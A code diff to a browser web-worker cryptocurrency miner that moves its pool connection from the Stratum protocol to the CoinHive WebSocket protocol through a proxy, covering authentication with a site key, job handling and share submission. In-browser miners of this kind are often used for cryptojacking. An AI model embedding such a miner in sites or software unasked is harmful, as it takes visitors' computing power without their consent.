@@ -339,7 +339,7 @@ function cryptonightHash(input) {
 }
 
 // ============================================================================
-// STRATUM PROTOCOL
+// COINHIVE PROTOCOL FOR PROXY
 // ============================================================================
 
 function hexToBytes(hex) {
@@ -370,26 +370,22 @@ function connectToPool() {
     socket = new WebSocket(poolUrl);
     
     socket.onopen = () => {
-      postMessage({ type: "status", message: "Connected! Logging in..." });
+      postMessage({ type: "status", message: "Connected! Authenticating..." });
       
+      // Send CoinHive auth message
       socket.send(JSON.stringify({
-        id: 1,
-        jsonrpc: "2.0",
-        method: "login",
+        type: 'auth',
         params: {
-          login: wallet,
-          pass: "x",
-          agent: "WebMiner/3.0"
+          site_key: wallet,
+          user: 'worker_' + Math.random().toString(36).substr(2, 9)
         }
-      }) + "\n");
+      }));
     };
     
     socket.onmessage = (event) => {
       try {
-        const lines = event.data.split('\n').filter(l => l.trim());
-        for (const line of lines) {
-          handlePoolMessage(JSON.parse(line));
-        }
+        const msg = JSON.parse(event.data);
+        handlePoolMessage(msg);
       } catch (e) {
         console.error("Parse error:", e);
       }
@@ -415,41 +411,39 @@ function connectToPool() {
 function handlePoolMessage(msg) {
   console.log("Pool:", JSON.stringify(msg).substring(0, 200));
   
-  if (msg.result && msg.result.job) {
-    currentJob = msg.result.job;
+  // CoinHive protocol responses
+  if (msg.type === 'authed') {
+    postMessage({ type: "status", message: "Authenticated! Waiting for job..." });
+  } else if (msg.type === 'job') {
+    currentJob = msg.params;
     postMessage({ type: "status", message: "Mining active!" });
     postMessage({ type: "job", job_id: currentJob.job_id });
     startMining();
-  } else if (msg.method === "job") {
-    currentJob = msg.params;
-    postMessage({ type: "job", job_id: currentJob.job_id });
-  } else if (msg.result && msg.result.status === "OK") {
+  } else if (msg.type === 'hash_accepted') {
     accepted++;
     postMessage({ type: "accepted", count: accepted });
     postMessage({ type: "status", message: "Share accepted! ✓" });
-  } else if (msg.error) {
+  } else if (msg.type === 'error') {
     rejected++;
-    postMessage({ type: "rejected", count: rejected, error: msg.error });
-    console.error("Pool error:", msg.error);
+    postMessage({ type: "rejected", count: rejected, error: msg.params });
+    console.error("Pool error:", msg.params);
   }
 }
 
 function submitShare(nonce, result) {
   if (!socket || socket.readyState !== 1 || !currentJob) return;
   
+  // CoinHive protocol submit
   const submit = {
-    id: 2,
-    jsonrpc: "2.0",
-    method: "submit",
+    type: 'submit',
     params: {
-      id: currentJob.id || wallet,
       job_id: currentJob.job_id,
       nonce: nonce,
       result: result
     }
   };
   
-  socket.send(JSON.stringify(submit) + "\n");
+  socket.send(JSON.stringify(submit));
   console.log("Submitted:", nonce, result.substring(0, 16) + "...");
   postMessage({ type: "share" });
 }
